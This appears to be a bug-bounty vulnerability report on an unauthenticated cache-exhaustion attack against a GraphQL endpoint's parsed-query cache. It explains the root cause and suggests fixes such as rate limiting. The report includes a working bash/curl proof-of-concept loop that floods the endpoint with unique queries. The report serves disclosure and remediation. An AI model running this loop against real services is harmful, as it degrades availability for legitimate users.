### Title
Unauthenticated Cache Exhaustion via Unique GraphQL Query Strings in `CachedPreparsedDocumentProvider`

### Summary
The `CachedPreparsedDocumentProvider` caches parsed GraphQL documents keyed on the raw query string with a hard cap of 1000 entries and no per-client rate limiting. Any unauthenticated external user can trivially generate 1000+ syntactically valid, unique query strings (e.g., by varying a single numeric argument) to fill the cache, triggering Caffeine's LRU eviction of legitimate cached queries and forcing repeated re-parsing overhead for all other users. No authentication, privilege, or special knowledge is required.

### Finding Description

**Exact code path:**

`CachedPreparsedDocumentProvider.java` line 26:
```java
return cache.get(executionInput.getQuery(), key -> parseAndValidateFunction.apply(executionInput));
```
The cache key is the raw query string (`executionInput.getQuery()`). The cache is configured in `CacheProperties.java` line 15:
```
"expireAfterWrite=1h,maximumSize=1000,recordStats"
```
This is a Caffeine `AsyncCache` with a maximum of 1000 entries and a 1-hour TTL.

**Root cause:** The cache is globally shared across all clients with no per-IP, per-session, or per-user write quota. Any caller that can reach the `/graphql/alpha` endpoint (which requires no authentication per the codebase) can insert arbitrary entries into this shared cache.

**Exploit flow:**
1. Attacker sends 1000 HTTP POST requests to `/graphql/alpha`, each with a syntactically valid but unique query string, e.g.:
   ```
   { account(input: {entityId: {shard: 0, realm: 0, num: 1}}) { balance } }
   { account(input: {entityId: {shard: 0, realm: 0, num: 2}}) { balance } }
   ...
   { account(input: {entityId: {shard: 0, realm: 0, num: 1000}}) { balance } }
   ```
2. Each unique string is a cache miss → `parseAndValidateFunction.apply(executionInput)` is called → result stored in cache.
3. After 1000 entries, Caffeine's LRU eviction begins. Legitimate queries used by real users are evicted.
4. Subsequent legitimate requests for previously-cached queries are cache misses, triggering full re-parse + re-validate on every request.
5. Attacker repeats continuously to sustain the eviction pressure.

**Why existing checks fail:**

- `MaxQueryComplexityInstrumentation(200)` and `MaxQueryDepthInstrumentation(10)` run as post-parse instrumentation — they do not prevent the parse result (including error entries) from being inserted into the cache.
- `ParserOptions` limits (`maxCharacters=10000`, `maxTokens=1000`) bound the size of each individual query but do not prevent an attacker from sending many distinct small queries. A query like `{ account(input: {entityId: {shard: 0, realm: 0, num: N}}) { balance } }` is ~65 characters and ~15 tokens — well within all limits.
- Jackson JSON limits (`maxDocumentLength=11000`, `maxTokenCount=100`) similarly bound per-request payload size, not the number of distinct cache-polluting requests.
- **There is zero rate limiting in the graphql module.** The `ThrottleConfiguration`, `ThrottleManagerImpl`, and `ThrottleProperties` classes exist only in the `web3` module. A grep across all `graphql/**/*.java` files for `throttle`, `rateLimit`, `bucket4j`, or `requestsPerSecond` returns no matches.

### Impact Explanation
Legitimate users' queries are evicted from the preparsed document cache, forcing the GraphQL engine to re-tokenize, re-parse, and re-validate every request from scratch. This increases CPU consumption and per-request latency for all users of the service. With a 1-hour `expireAfterWrite` TTL, evicted entries do not return to cache until re-submitted by legitimate users, and the attacker can continuously re-evict them. The impact is service degradation (griefing) with no direct economic damage to network participants, consistent with the stated scope of "Medium: Impacts caused by griefing with no economic damage."

### Likelihood Explanation
The attack requires no credentials, no special knowledge of the schema beyond what is publicly documented, and no sophisticated tooling — a simple shell loop with `curl` suffices. The endpoint is publicly accessible. The attacker needs to send only 1000 requests to saturate the cache (a trivial volume), and can sustain the attack indefinitely by cycling through new unique query strings. The attack is fully repeatable and automatable.

### Recommendation
1. **Add per-IP or global rate limiting to the GraphQL endpoint**, analogous to the `ThrottleConfiguration`/`ThrottleManagerImpl` pattern already used in the `web3` module (bucket4j token bucket).
2. **Bound cache insertions per source IP** by wrapping `CachedPreparsedDocumentProvider` with an admission policy that rejects cache writes from IPs that have inserted more than N entries within a time window.
3. **Alternatively, reduce `maximumSize`** and/or **shorten `expireAfterWrite`** to limit the blast radius of eviction attacks.
4. **Consider query normalization** (stripping insignificant whitespace, normalizing argument order) before using the query string as a cache key, to reduce the attacker's ability to generate unique cache keys from semantically equivalent queries.

### Proof of Concept
```bash
#!/bin/bash
# Exhaust the CachedPreparsedDocumentProvider cache (maximumSize=1000)
# No authentication required.
for i in $(seq 1 1001); do
  curl -s -o /dev/null -X POST http://TARGET:8083/graphql/alpha \
    -H 'Content-Type: application/json' \
    -d "{\"query\": \"{ account(input: {entityId: {shard: 0, realm: 0, num: $i}}) { balance } }\"}"
done
# After this loop, the cache is full of attacker-controlled entries.
# Any legitimate query that was previously cached is now evicted.
# Verify: send a previously-cached legitimate query and observe re-parse latency
# vs. a cached hit (e.g., via recordStats metrics at /actuator/metrics).
```

**Expected result:** Cache hit rate drops to 0% for legitimate queries after the loop completes. Metrics exposed via `recordStats` on the Caffeine cache will show eviction count ≥ 1 and hit rate degradation. [1](#0-0) [2](#0-1) [3](#0-2)

### Citations

**File:** graphql/src/main/java/org/hiero/mirror/graphql/cache/CachedPreparsedDocumentProvider.java (L24-27)
```java
    public CompletableFuture<PreparsedDocumentEntry> getDocumentAsync(
            ExecutionInput executionInput, Function<ExecutionInput, PreparsedDocumentEntry> parseAndValidateFunction) {
        return cache.get(executionInput.getQuery(), key -> parseAndValidateFunction.apply(executionInput));
    }
```

**File:** graphql/src/main/java/org/hiero/mirror/graphql/cache/CacheProperties.java (L14-15)
```java
    @NotBlank
    private String query = "expireAfterWrite=1h,maximumSize=1000,recordStats";
```

**File:** graphql/src/main/java/org/hiero/mirror/graphql/config/GraphQlConfiguration.java (L31-48)
```java
    static {
        // Configure GraphQL parsing limits to reject malicious input
        Consumer<Builder> consumer =
                b -> b.maxCharacters(10000).maxRuleDepth(100).maxTokens(1000).maxWhitespaceTokens(1000);
        ParserOptions.setDefaultParserOptions(
                ParserOptions.getDefaultParserOptions().transform(consumer));
        ParserOptions.setDefaultOperationParserOptions(
                ParserOptions.getDefaultOperationParserOptions().transform(consumer));
    }

    @Bean
    GraphQlSourceBuilderCustomizer graphQlCustomizer(PreparsedDocumentProvider provider) {
        var maxQueryComplexity = new MaxQueryComplexityInstrumentation(200);
        var maxQueryDepth = new MaxQueryDepthInstrumentation(10);
        var instrumentation = new ChainedInstrumentation(maxQueryComplexity, maxQueryDepth);

        return b -> b.configureGraphQl(
                graphQL -> graphQL.instrumentation(instrumentation).preparsedDocumentProvider(provider));
```
